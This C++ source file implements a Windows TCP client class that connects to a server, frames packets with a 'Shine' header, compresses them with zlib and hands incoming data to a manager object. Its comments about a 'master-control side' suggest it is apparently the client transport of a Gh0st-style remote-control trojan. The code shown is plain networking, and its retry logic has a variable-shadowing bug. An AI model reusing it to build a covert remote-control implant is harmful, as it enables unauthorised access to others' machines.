#include "_IOCPClient.h"


_CIOCPClient::_CIOCPClient()
{
	//初始化套接字
	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData)!= 0)
	{
		return;
	}
	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL,TRUE,FALSE,NULL);
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGHT);
	m_IsReceiving = TRUE;
}

_CIOCPClient::~_CIOCPClient()
{
	//关闭通讯套接字
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}
	//关闭工作线程句柄
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = INVALID_HANDLE_VALUE;
	}
	//关闭事件
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = INVALID_HANDLE_VALUE;
	}
	WSACleanup();
}


BOOL _CIOCPClient::ConnectServer(char* ServerIPAddress, USHORT ServerConnectPort)
{
	//生成一个通讯套接字
	m_ClientSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//初始化Server端网卡
	SOCKADDR_IN ServerAddress;
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_port = htons(ServerConnectPort);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIPAddress);
	//链接服务器
	if (connect(m_ClientSocket, (SOCKADDR*)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}
	//启动一个工作线程
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);//等待接受数据
	return TRUE;

}

DWORD _CIOCPClient::WorkThreadProcedure(LPVOID ParaemterData)
{
	_CIOCPClient *This =(_CIOCPClient*)ParaemterData;
	fd_set OldSocketSet;
	fd_set NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);
	//接受数据内存
	char BufferData[PACKET_LENGTH] = { 0 };
	//将上线通讯套接字放入集合中
	FD_SET(This->m_ClientSocket, &OldSocketSet);

	while(This->IsReceiving())
	{
		NewSocketSet = OldSocketSet;
		//服务器如果没有数据发送到客户端将阻塞在select函数中
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);
		if (IsOk==SOCKET_ERROR)
		{
			This->DisConnect();
			printf("IsReceiving关闭\r\n");
			break;
		}
		if (IsOk>0)
		{
			//服务器传送网络数据
			memset(BufferData, 0, sizeof(BufferData));
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);     //接收主控端发来的数据
			if (BufferLength <= 0)
			{
				int a = GetLastError();
				printf("WorkThreadProcedure接受数据 主控端关闭我了\r\n");
				This->DisConnect();//接收错误处理
				break;
			}
			if (BufferLength > 0)
			{
				This->OnReceiving((char*)BufferData, BufferLength);   //正确接收就调用 OnRead处理 转到OnRead
			}
		}
	}
	return 0;
}

VOID _CIOCPClient::DisConnect()
{
	CancelIo((HANDLE)m_ClientSocket);//取消当前套接字
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);//通知工作线程退出的信号
	closesocket(m_ClientSocket);//会触发对方接受-1数据
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}

int _CIOCPClient::OnSending(char *BufferData, ULONG BufferLength)
{
	m_SendCompressdBufferData.ClearBuffer();
	if (BufferLength>0)
	{
		unsigned long CompressedLength = (double)BufferLength*1.001 + 12;
		LPBYTE CompressedData = new BYTE[CompressedLength];
		if (CompressedData ==NULL)
		{
			return 0;
		}

		int IsOk =compress(CompressedData, &CompressedLength,(PBYTE)BufferData, BufferLength);
		if ( IsOk != Z_OK)
		{
			//数据包压缩成功
			delete[] CompressedData;
			return FALSE;
		}

		ULONG PackTotalLenght = CompressedLength + PACKET_HEADER_LENGHT;

		m_SendCompressdBufferData.WriteBuffer((LPBYTE)m_PacketHeaderFlag,
			sizeof(m_PacketHeaderFlag));
		m_SendCompressdBufferData.WriteBuffer((LPBYTE)&PackTotalLenght,sizeof(ULONG));
		m_SendCompressdBufferData.WriteBuffer((LPBYTE)&BufferLength,sizeof(ULONG));
		m_SendCompressdBufferData.WriteBuffer(CompressedData,CompressedLength);
		//[][PackTotalLenght][BufferLength][.....真实数据Data]
		delete[] CompressedData;
		CompressedData = NULL;

	}
	return SendWithSpilt((char*)m_SendCompressdBufferData.GetBuffer(),
		m_SendCompressdBufferData.GetBufferLength(), MAX_SEND_BUFFER);
}

BOOL _CIOCPClient::SendWithSpilt(char *BufferData, ULONG BufferLength, ULONG SplitLengh)
{
	int ReturnLengh = 0;
	const char* Travel = (char*)BufferData;
	int i = 0;
	ULONG Sended = 0;
	ULONG SendRetry = 15;
	int j = 0;

	for (i = BufferLength; i >= SplitLengh; i -= SplitLengh)
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLengh = send(m_ClientSocket, Travel, SplitLengh, 0);
			if (ReturnLengh > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += SplitLengh;
		Travel += ReturnLengh;

		Sleep(15);
	}

	if (i>0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLengh = send(m_ClientSocket, (char*)Travel, i, 0);
			Sleep(15);
			if (ReturnLengh>0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLengh;
	}
	if (Sended== BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

VOID _CIOCPClient::OnReceiving(char* BufferData, ULONG BufferLength) 
{ 
	//接收主控端的数据
	try
	{
		if (BufferLength == 0)
		{
			DisConnect();       //错误处理
			return;
		}
		//接到数据放到m_ReceivedCompressdBufferData中
		m_ReceivedCompressdBufferData.WriteBuffer((LPBYTE)BufferData, BufferLength);

		//检测数据是否大于数据头大小 如果不是那就不是正确的数据
		while (m_ReceivedCompressdBufferData.GetBufferLength() > PACKET_HEADER_LENGHT)
		{
			char v1[PACKET_FLAG_LENGHT] = { 0 };
			CopyMemory(v1, m_ReceivedCompressdBufferData.GetBuffer(), PACKET_FLAG_LENGHT);
			//判断数据头
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGHT) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_ReceivedCompressdBufferData.GetBuffer(PACKET_FLAG_LENGHT),
				sizeof(ULONG));

			//--- 数据的大小正确判断
			if (PackTotalLength &&
				(m_ReceivedCompressdBufferData.GetBufferLength()) >= PackTotalLength)
			{

				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)v1, PACKET_FLAG_LENGHT);    //读取各种头部 shine

				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DecompressedLength = 0;
				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)&DecompressedLength, sizeof(ULONG));


				//50  
				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGHT;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DecompressedData = new BYTE[DecompressedLength];


				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}
				m_ReceivedCompressdBufferData.ReadBuffer(CompressedData, CompressedLength);
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);

				if (IsOk == Z_OK)//如果解压成功
				{
					m_ReceivedDecompressdBufferData.ClearBuffer();
					m_ReceivedDecompressdBufferData.WriteBuffer(DecompressedData,
						DecompressedLength);

					//解压好的数据和长度传递给对象Manager进行处理 注意这里是用了多态
					//由于m_pManager中的子类不一样造成调用的OnReceive函数不一样

					delete[] CompressedData;
					delete[] DecompressedData;


					m_Manager->HandleIO((PBYTE)m_ReceivedDecompressdBufferData.GetBuffer(0),
						m_ReceivedDecompressdBufferData.GetBufferLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_ReceivedCompressdBufferData.ClearBuffer();
		m_ReceivedDecompressdBufferData.ClearBuffer();
	}
}